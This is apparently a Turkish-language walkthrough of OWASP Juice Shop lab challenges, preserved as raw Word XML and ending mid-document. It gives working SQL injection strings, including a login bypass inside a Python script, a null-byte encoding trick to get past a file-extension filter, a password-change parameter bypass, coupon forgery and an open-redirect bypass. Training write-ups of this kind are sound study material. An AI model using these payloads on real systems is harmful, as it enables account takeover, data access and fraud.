            <wp:effectExtent l="0" t="0" r="0" b="9525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895" w:rsidRDefault="00832895" w:rsidP="00832895">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Akabinde ise sepetimize giderek “Checkout” yapmamız durumunda biz para ödemek yerine site bize para ödeyecek ve challange tamamlanacaktır.</w:t>
      </w:r>
      <w:r w:rsidR="001F34EF">
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:r w:rsidRPr="00832895">
        <w:rPr>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:sym w:font="Wingdings" w:char="F04A"/>
      </w:r>
    </w:p>
    <w:p w:rsidR="00400466" w:rsidRDefault="002D3720" w:rsidP="002D3720">
      <w:pPr>
        <w:pStyle w:val="Balk2"/>
      </w:pPr>
      <w:r>
        <w:t>Christmas Special---Order the Christmas special offer of 2014.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00732217" w:rsidRDefault="00732217" w:rsidP="00732217">
      <w:r w:rsidRPr="00732217">
        <w:t>Sql</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00400BEC">
        <w:t>I</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">njection zafiyeti bulunan </w:t>
      </w:r>
      <w:r w:rsidRPr="00732217">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">http://192.168.33.10:3000/rest/products/search?q= </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>kısım</w:t>
      </w:r>
      <w:r w:rsidR="00572492">
        <w:t xml:space="preserve"> ve url encode </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">kullanılarak </w:t>
      </w:r>
      <w:r w:rsidR="00572492">
        <w:t xml:space="preserve">bu challange çözülebilir. </w:t>
      </w:r>
      <w:r w:rsidR="00572492" w:rsidRPr="00572492">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>http://192.168.33.10:3000/rest/products/search?q=christmas%25%27))--</w:t>
      </w:r>
      <w:r w:rsidR="00572492">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00572492">
        <w:t xml:space="preserve">şeklinde arama yaparak </w:t>
      </w:r>
      <w:r w:rsidR="00572492" w:rsidRPr="00572492">
        <w:t>"Christmas Super-Surprise-Box (2014 Edition)"</w:t>
      </w:r>
      <w:r w:rsidR="00572492">
        <w:t xml:space="preserve"> ürününe ve id’sine ulaşabiliriz.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00400466" w:rsidRDefault="00A45272" w:rsidP="00AD7169">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="3559E814" wp14:editId="3141369A">
            <wp:extent cx="2802194" cy="548640"/>
            <wp:effectExtent l="0" t="0" r="0" b="381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51181" cy="55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ve Id ile Burp tool aracılığıyla herhangi bir ürün Id’si 10 olarak değiştirilip “Checkout” yapılarak bu challange tamamlanır.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00AD7169" w:rsidRDefault="00EF2406" w:rsidP="005D39FF">
      <w:pPr>
        <w:pStyle w:val="Balk2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="18BA4953" wp14:editId="13A3CF1E">
            <wp:extent cx="2228850" cy="809625"/>
            <wp:effectExtent l="0" t="0" r="0" b="9525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02081474" wp14:editId="4FD08412">
            <wp:extent cx="2085975" cy="821741"/>
            <wp:effectExtent l="0" t="0" r="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88239" cy="82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169" w:rsidRDefault="00AD7169" w:rsidP="005D39FF">
      <w:pPr>
        <w:pStyle w:val="Balk2"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00AD7169" w:rsidRDefault="00AD7169" w:rsidP="005D39FF">
      <w:pPr>
        <w:pStyle w:val="Balk2"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00AD7169" w:rsidRDefault="00AD7169" w:rsidP="005D39FF">
      <w:pPr>
        <w:pStyle w:val="Balk2"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00EF2406" w:rsidRDefault="00EF2406" w:rsidP="005D39FF">
      <w:pPr>
        <w:pStyle w:val="Balk2"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="005D39FF" w:rsidRDefault="005D39FF" w:rsidP="005D39FF">
      <w:pPr>
        <w:pStyle w:val="Balk2"/>
      </w:pPr>
      <w:r w:rsidRPr="005D39FF">
        <w:lastRenderedPageBreak/>
        <w:t>Upload Size---Upload a file larger than 100 kB.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="005D39FF" w:rsidRDefault="005D39FF" w:rsidP="005D39FF">
      <w:pPr>
        <w:pStyle w:val="Balk2"/>
        <w:rPr>
          <w:color w:val="FF0000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005D39FF">
        <w:rPr>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:t>Ve</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="005D39FF" w:rsidRDefault="005D39FF" w:rsidP="005D39FF">
      <w:pPr>
        <w:pStyle w:val="Balk2"/>
      </w:pPr>
      <w:r>
        <w:t>Upload Type---Upload a file that has no .pdf or .zip extension.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00400466" w:rsidRPr="00400466" w:rsidRDefault="00400466" w:rsidP="00400466">
      <w:r>
        <w:t>Bunun için bir python scripti yazdım.Herhangi bir kullanıcı ile giriş yapmamız gerek çünkü ancak kullanıc</w:t>
      </w:r>
      <w:r w:rsidR="0009348D">
        <w:t>ı</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">lar </w:t>
      </w:r>
      <w:r w:rsidR="00CB6982">
        <w:t>“</w:t>
      </w:r>
      <w:r>
        <w:t>Complaint</w:t>
      </w:r>
      <w:r w:rsidR="00CB6982">
        <w:t>”</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> sekmesini kullanabiliyor.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00400466" w:rsidRDefault="00400466" w:rsidP="00400466">
      <w:r>
        <w:t>import requests</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00400466" w:rsidRDefault="00400466" w:rsidP="00400466">
      <w:r>
        <w:t>import json</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00400466" w:rsidRDefault="00400466" w:rsidP="00400466">
      <w:r>
        <w:t>import os</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00400466" w:rsidRDefault="00400466" w:rsidP="00400466">
      <w:r>
        <w:t>session = requests.Session()</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00400466" w:rsidRDefault="00400466" w:rsidP="00400466">
      <w:r>
        <w:t>jsurl = 'http://192.168.33.10:3000'</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00400466" w:rsidRDefault="00400466" w:rsidP="00400466">
      <w:r>
        <w:t># Giriş yapmamız lazımki birşeyler şikayet edelim</w:t>
      </w:r>
      <w:r w:rsidR="00473FD2">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="0030794F">
        <w:t>;</w:t>
      </w:r>
      <w:r w:rsidR="00473FD2">
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00400466" w:rsidRDefault="00400466" w:rsidP="00400466">
      <w:r>
        <w:t>auth = json.dumps({'email': 'admin@juice-sh.op\'--', 'password': 'admin123'})</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00400466" w:rsidRDefault="00400466" w:rsidP="00400466">
      <w:r>
        <w:t>login = session.post('{}/rest/user/login'.format(jsurl),</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00400466" w:rsidRDefault="00400466" w:rsidP="00400466">
      <w:r>
        <w:t xml:space="preserve">                     headers={'Content-Type': 'application/json'},</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00400466" w:rsidRDefault="00400466" w:rsidP="00400466">
      <w:r>
        <w:t xml:space="preserve">                     data=auth)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00400466" w:rsidRDefault="00400466" w:rsidP="00400466">
      <w:r>
        <w:t>if not login.ok:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00400466" w:rsidRDefault="00400466" w:rsidP="00400466">
      <w:r>
        <w:t xml:space="preserve">    raise RuntimeError(</w:t>
      </w:r>
      <w:r w:rsidR="007D2F8A">
        <w:t>Giriş Hatası</w:t>
      </w:r>
      <w:r>
        <w:t>')</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00400466" w:rsidRDefault="00400466" w:rsidP="00400466">
      <w:r>
        <w:t># dosya oluştur 150kb boyuutlu</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00400466" w:rsidRDefault="00400466" w:rsidP="00400466">
      <w:r>
        <w:t>with open('said.txt', 'wb') as outfile:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00400466" w:rsidRDefault="00400466" w:rsidP="00400466">
      <w:r>
        <w:t xml:space="preserve">    outfile.truncate(1024 * 150)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00400466" w:rsidRDefault="00400466" w:rsidP="00400466">
      <w:r>
        <w:t>with open('said.txt', 'rb') as infile:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00400466" w:rsidRDefault="00400466" w:rsidP="00400466">
      <w:r>
        <w:t xml:space="preserve">    files = {'file': ('herniyse', infile, 'application/json')}</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00400466" w:rsidRDefault="00400466" w:rsidP="00400466">
      <w:r>
        <w:t xml:space="preserve">    # dosyayı yükleme</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00400466" w:rsidRDefault="00400466" w:rsidP="00400466">
      <w:r>
        <w:t xml:space="preserve">    upload = session.post('{}/file-upload'.format(jsurl), files=files)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00400466" w:rsidRDefault="00400466" w:rsidP="00400466">
      <w:r>
        <w:t xml:space="preserve">    if not upload.ok:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00400466" w:rsidRDefault="00400466" w:rsidP="00400466">
      <w:r>
        <w:t xml:space="preserve">        raise RuntimeError('Dosya Yüklemede Hata Oluştu.')</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00400466" w:rsidRPr="00400466" w:rsidRDefault="00400466" w:rsidP="00400466">
      <w:r>
        <w:t>os.remove('said.txt')</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="006A325A" w:rsidRDefault="006A325A" w:rsidP="00EF2406">
      <w:pPr>
        <w:pStyle w:val="Balk2"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00EF2406" w:rsidRDefault="00EF2406" w:rsidP="00EF2406">
      <w:pPr>
        <w:pStyle w:val="Balk2"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Forgotten Developer Backup--</w:t>
      </w:r>
      <w:r w:rsidR="0091666D">
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:t>Access a developer's forgotten backup file.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00EF2406" w:rsidRPr="00EF2406" w:rsidRDefault="00EF2406" w:rsidP="00EF2406">
      <w:pPr>
        <w:pStyle w:val="Balk2"/>
        <w:rPr>
          <w:color w:val="FF0000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00EF2406">
        <w:rPr>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:t>ve</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00952618" w:rsidRDefault="00DA43FF" w:rsidP="00952618">
      <w:pPr>
        <w:pStyle w:val="Balk2"/>
      </w:pPr>
      <w:r>
        <w:t>Easter Egg---Find the hidden easter egg.</w:t>
      </w:r>
      <w:r w:rsidR="00952618">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00400466" w:rsidRDefault="00952618" w:rsidP="00952618">
      <w:pPr>
        <w:pStyle w:val="Balk2"/>
      </w:pPr>
      <w:r>
        <w:t>Nested Easter Egg---Apply some advanced cryptanalysis to find the real easter egg.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00EF2406" w:rsidRDefault="00EF2406" w:rsidP="00EF2406">
      <w:pPr>
        <w:pStyle w:val="Balk2"/>
        <w:rPr>
          <w:color w:val="FF0000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00EF2406">
        <w:rPr>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:t>Ve</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00EF2406" w:rsidRDefault="00EF2406" w:rsidP="00EF2406">
      <w:pPr>
        <w:pStyle w:val="Balk2"/>
      </w:pPr>
      <w:r>
        <w:t>Forgotten Sales Backup---Access a salesman's forgotten backup file.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00FB3A21" w:rsidRPr="00FB3A21" w:rsidRDefault="00FB3A21" w:rsidP="00FB3A21">
      <w:pPr>
        <w:pStyle w:val="Balk2"/>
        <w:rPr>
          <w:color w:val="FF0000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FB3A21">
        <w:rPr>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:t>Ve</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00FB3A21" w:rsidRDefault="00FB3A21" w:rsidP="00FB3A21">
      <w:pPr>
        <w:pStyle w:val="Balk2"/>
      </w:pPr>
      <w:r>
        <w:t>Misplaced Signature File---Access a misplaced SIEM signature file.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00124470" w:rsidRPr="00124470" w:rsidRDefault="00124470" w:rsidP="00124470"/>
    <w:p w:rsidR="001A4CB0" w:rsidRDefault="006A2CB8" w:rsidP="006A2CB8">
      <w:r>
        <w:t>/ftp içerisinde bir .md ile .pdf dosyalarına erişime izin veriliyor. Bu yüzden .bak  ve .gg dosyalarına erişebilmek için ufak url encoding yöntemi kullanmalıyız.</w:t>
      </w:r>
      <w:r w:rsidR="00AB6478">
        <w:t xml:space="preserve"> Bunun için sanki boş bir veri için %00 olmalı ve % için %25 kullanılmalı ve izin verilen bir dosya uzantısı(örneğin:.pdf) eklenmelidir. </w:t>
      </w:r>
      <w:r w:rsidR="0053281A">
        <w:t>Örneğin;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="006A2CB8" w:rsidRDefault="00AB6478" w:rsidP="006A2CB8">
      <w:r w:rsidRPr="00AB6478">
        <w:t>/ftp/</w:t>
      </w:r>
      <w:r w:rsidR="001A4CB0" w:rsidRPr="001A4CB0">
        <w:t xml:space="preserve"> eastere.gg</w:t>
      </w:r>
      <w:r w:rsidRPr="00AB6478">
        <w:t>%2500.pdf</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> şeklinde yapılmalı ve indirilen dosyadan .pdf ve</w:t>
      </w:r>
      <w:r w:rsidR="001A4CB0">
        <w:t xml:space="preserve"> varsa</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> .bak uzantıları kaldırılarak dosyaya erişilmelidir.</w:t>
      </w:r>
      <w:r w:rsidR="00112ED9">
        <w:t>Nested Easter Egg challange’i</w:t>
      </w:r>
      <w:r w:rsidR="00124470">
        <w:t xml:space="preserve"> haricinde dosyalar indirildiğinde challangeler tamamlanır.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="001067DF" w:rsidRDefault="003908B6" w:rsidP="006A2CB8">
      <w:r w:rsidRPr="003908B6">
        <w:t xml:space="preserve">Nested Easter Egg </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="006F1DB9">
        <w:t>içinse</w:t>
      </w:r>
      <w:r w:rsidR="0053281A" w:rsidRPr="0053281A">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0053281A" w:rsidRDefault="00FF26FF" w:rsidP="006A2CB8">
      <w:r>
        <w:t>Eastere.gg</w:t>
      </w:r>
      <w:r w:rsidR="004913D3">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="001067DF">
        <w:t>dosya</w:t>
      </w:r>
      <w:r w:rsidR="004913D3">
        <w:t>sı</w:t>
      </w:r>
      <w:r w:rsidR="001067DF">
        <w:t xml:space="preserve"> iç</w:t>
      </w:r>
      <w:r w:rsidR="00F07085">
        <w:t>e</w:t>
      </w:r>
      <w:r w:rsidR="001067DF">
        <w:t xml:space="preserve">risinde </w:t>
      </w:r>
      <w:r w:rsidR="0053281A" w:rsidRPr="00536562">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>L2d1ci9xcmlmL25lci9mYi9zaGFhbC9ndXJsL3V2cS9uYS9ybmZncmUvcnR0L2p2Z3V2YS9ndXIvcm5mZ3JlL3J0dA==</w:t>
      </w:r>
      <w:r w:rsidR="0053281A">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00295358">
        <w:t xml:space="preserve">şeklinde bir </w:t>
      </w:r>
      <w:r w:rsidR="0053281A">
        <w:t>metin yazmaktadır. Bu metni base64 ile decode edersek;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0053281A" w:rsidRDefault="0053281A" w:rsidP="006A2CB8">
      <w:r w:rsidRPr="00536562">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>/gur/qrif/ner/fb/shaal/gurl/uvq/na/rnfgre/rtt/jvguva/gur/rnfgre/rtt</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> şeklinde karışık bir metin elde ederiz bunuda rot-13 ile kaydırırsak;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0053281A" w:rsidRDefault="0053281A" w:rsidP="006A2CB8">
      <w:r w:rsidRPr="00536562">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>the/devs/are/so/funny/they/hid/an/easter/egg/within/the/easter/egg</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> metnine ulaşırız bu </w:t>
      </w:r>
      <w:r w:rsidR="00536562">
        <w:t>metnide url’imize</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> eklersek challange tamamlanır.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00952618" w:rsidRDefault="00952618" w:rsidP="006A2CB8">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="67CACCE8" wp14:editId="237564C6">
            <wp:extent cx="5940853" cy="2509113"/>
            <wp:effectExtent l="0" t="0" r="3175" b="5715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86940" cy="252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BEB" w:rsidRDefault="00DF1BEB" w:rsidP="00DF1BEB">
      <w:pPr>
        <w:pStyle w:val="Balk2"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Change Bender's Password---Change Bender's password into slurmCl4ssic without using SQL Injection or Forgot Password.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00F93800" w:rsidRDefault="00F93800" w:rsidP="00F93800">
      <w:r>
        <w:t>Bender</w:t>
      </w:r>
      <w:r w:rsidR="00DE73A7">
        <w:t xml:space="preserve"> kullancısı ile oturum açmalı ve “Change Password” sekmesinde form’</w:t>
      </w:r>
      <w:r w:rsidR="005A1126">
        <w:t>un</w:t>
      </w:r>
      <w:r w:rsidR="00DE73A7">
        <w:t xml:space="preserve"> “Current Pasword”’e rastgele bir değer ve “New Password” ve “Repeat New Password” kısmına “</w:t>
      </w:r>
      <w:r w:rsidR="00DE73A7" w:rsidRPr="00DE73A7">
        <w:t>slurmCl4ssic</w:t>
      </w:r>
      <w:r w:rsidR="00DE73A7">
        <w:t xml:space="preserve">” yazmalı ve </w:t>
      </w:r>
      <w:r w:rsidR="009F083A">
        <w:t>Change butonuna tıkladığımız zaman Burp toolu ile gönderilen istekte;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F083A" w:rsidRDefault="009F083A" w:rsidP="00F93800">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00133031">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>/rest/user/change-password?current=abcde&amp;new=slurmCl4ssic&amp;repeat=slurmCl4ssic</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00133031" w:rsidRDefault="00133031" w:rsidP="00F93800">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">current=abcde </w:t>
      </w:r>
      <w:r w:rsidRPr="00D50A42">
        <w:t>kısmını silerek.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D50A42" w:rsidRDefault="00D50A42" w:rsidP="00F93800">
      <w:r w:rsidRPr="00D50A42">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>/rest/user/change-password?new=slurmCl4ssic&amp;repeat=slurmCl4ssic</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00D50A42">
        <w:t>şeklinde istekte bulunmalıyız</w:t>
      </w:r>
      <w:r>
        <w:t>.Bu şekilde bu challange’de tamamlanmış olur.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00095486" w:rsidRDefault="00095486" w:rsidP="00095486">
      <w:pPr>
        <w:pStyle w:val="Balk2"/>
      </w:pPr>
      <w:r>
        <w:t>Login CISO---Exploit OAuth 2.0 to log in with the Chief Information Security Officer's user account.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00256432" w:rsidRDefault="00E743DF" w:rsidP="00256432">
      <w:r>
        <w:t xml:space="preserve">Burp tool’u </w:t>
      </w:r>
      <w:r w:rsidR="008B547F">
        <w:t xml:space="preserve">içerisindeki Repeater </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">ile /rest/user/login yoluna bir POST isteği göndermemiz ve </w:t>
      </w:r>
      <w:r w:rsidR="003D00B4" w:rsidRPr="003D00B4">
        <w:t>Header</w:t>
      </w:r>
      <w:r w:rsidR="003D00B4">
        <w:t xml:space="preserve"> kısmına</w:t>
      </w:r>
      <w:r w:rsidR="003D00B4" w:rsidRPr="003D00B4">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="003D00B4" w:rsidRPr="00FD5873">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">X-User-Email: </w:t>
      </w:r>
      <w:r w:rsidR="002E7266" w:rsidRPr="00FD5873">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ciso@juice-sh.op</w:t>
      </w:r>
      <w:r w:rsidR="002E7266">
        <w:t xml:space="preserve"> eklememiz</w:t>
      </w:r>
      <w:r w:rsidR="00FD5873">
        <w:t xml:space="preserve"> ve </w:t>
      </w:r>
      <w:r w:rsidR="00A24F5A" w:rsidRPr="00A24F5A">
        <w:t xml:space="preserve">Body </w:t>
      </w:r>
      <w:r w:rsidR="00A24F5A">
        <w:t xml:space="preserve"> kısmına </w:t>
      </w:r>
      <w:r w:rsidR="00FD5873">
        <w:t>varolan bir kullanıcı</w:t>
      </w:r>
      <w:r w:rsidR="00A24F5A">
        <w:t xml:space="preserve"> bilgileri</w:t>
      </w:r>
      <w:r w:rsidR="00FD5873">
        <w:t xml:space="preserve"> ile göndermemiz challange’i çözmek için yeterli olacaktır.</w:t>
      </w:r>
      <w:r w:rsidR="008B547F">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003D0DEC" w:rsidRDefault="00065ECB" w:rsidP="00256432">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="4F26F57E" wp14:editId="50304E9C">
            <wp:extent cx="5943600" cy="2406701"/>
            <wp:effectExtent l="0" t="0" r="0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6581" cy="240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ADE" w:rsidRDefault="001C1ADE" w:rsidP="001C1ADE">
      <w:pPr>
        <w:pStyle w:val="Balk2"/>
      </w:pPr>
      <w:r>
        <w:t>Forged Coupon---Forge a coupon code that gives you a discount of at least 80%.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="001C1ADE" w:rsidRPr="001C1ADE" w:rsidRDefault="001C1ADE" w:rsidP="001C1ADE">
      <w:r>
        <w:t xml:space="preserve">/ftp içerisindeki </w:t>
      </w:r>
      <w:r w:rsidRPr="001C1ADE">
        <w:t>coupons_2013.md</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> dosyası incelendiğinde içerisinde karışık bi</w:t>
      </w:r>
      <w:r w:rsidR="00527BA7">
        <w:t>rkaç metin olduğu görülebilir son kısımlarındaki benzerlikler dışında aklıma bir şey gelmedi</w:t>
      </w:r>
      <w:r w:rsidR="006953A3">
        <w:t>.Googleladığım zaman</w:t>
      </w:r>
      <w:r w:rsidR="00A0050A">
        <w:t xml:space="preserve"> z85 olduğu ile ilgili web sitelerinde birşeyler gözüme çarptı ve </w:t>
      </w:r>
      <w:hyperlink r:id="rId31" w:history="1">
        <w:r w:rsidR="00A0050A" w:rsidRPr="0061417F">
          <w:rPr>
            <w:rStyle w:val="Kpr"/>
          </w:rPr>
          <w:t>https://cryptii.com/pipes/z85-encoder</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="00A0050A">
        <w:t xml:space="preserve"> adresinden decode ettiğimde: </w:t>
      </w:r>
      <w:r w:rsidR="00A0050A" w:rsidRPr="00A0050A">
        <w:t>n&lt;MibgC7sn</w:t>
      </w:r>
      <w:r w:rsidR="00A0050A">
        <w:t xml:space="preserve"> için </w:t>
      </w:r>
      <w:r w:rsidR="00A0050A" w:rsidRPr="00A0050A">
        <w:t>JAN13-10</w:t>
      </w:r>
      <w:r w:rsidR="00A0050A">
        <w:t xml:space="preserve"> şeklinde bir sonuç aldım. İlk 3 kısım kuponun geçerli olduğu ayı sonraki 2 yılı ve son 2 ise indirim oranını belirtiyor bizden %80 ve üstü dediği için DEC19-80 yazıp encode ettim ve </w:t>
      </w:r>
      <w:r w:rsidR="00A0050A" w:rsidRPr="00A0050A">
        <w:t>l}6D$iw0iA</w:t>
      </w:r>
      <w:r w:rsidR="00A0050A">
        <w:t xml:space="preserve"> şeklinde sonuç aldım ve herhangi bir kullanıcı hesabı ile “Checkout” yaparken co</w:t>
      </w:r>
      <w:r w:rsidR="00C123F4">
        <w:t>upon kısmına yazıldığı takdirde challange tamamlandı bildirimini aldım.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003A5D0D" w:rsidRPr="003A5D0D" w:rsidRDefault="003A5D0D" w:rsidP="003A5D0D"/>
    <w:p w:rsidR="005D39FF" w:rsidRDefault="0076120E" w:rsidP="0076120E">
      <w:pPr>
        <w:pStyle w:val="Balk2"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Whitelist Bypass---Enforce a redirect to a page you are not supposed to redirect to.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB3125" w:rsidRDefault="00102473" w:rsidP="00CB3125">
      <w:r>
        <w:t>Biraz araştırdıktan sonra</w:t>
      </w:r>
      <w:r w:rsidR="00DF14E6">
        <w:t>;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00496DAA" w:rsidRDefault="00496DAA" w:rsidP="00CB3125">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="1DF2AF31" wp14:editId="7FF347A9">
            <wp:extent cx="5942965" cy="767910"/>
            <wp:effectExtent l="0" t="0" r="635" b="0"/>
            <wp:docPr id="14" name="Resim 14" descr="https://www.techsuii.com/wp-content/uploads/2018/01/Screen-Shot-2561-01-08-at-02.19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techsuii.com/wp-content/uploads/2018/01/Screen-Shot-2561-01-08-at-02.19.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454" b="22087"/>
                    <a:stretch/>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5943600" cy="767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6DAA" w:rsidRDefault="00496DAA" w:rsidP="00CB3125">
      <w:r>
        <w:t>Yanlızca kendi dağıtımının yapıldığı sayfaya redirect ettirebileceğimiz ile ilgili bir whitelisti olduğunu farkettim ve;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB3125" w:rsidRPr="005439E0" w:rsidRDefault="00CB3125" w:rsidP="005439E0">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:sz w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00CB3125">
        <w:rPr>
          <w:b/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>http://192.168.33.10:3000/redirect?to=https://google.com/?</w:t>
      </w:r>
      <w:r w:rsidR="005439E0" w:rsidRPr="005439E0">
        <w:rPr>
          <w:b/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>https//github.com/bkimminich/juice-shop</w:t>
      </w:r>
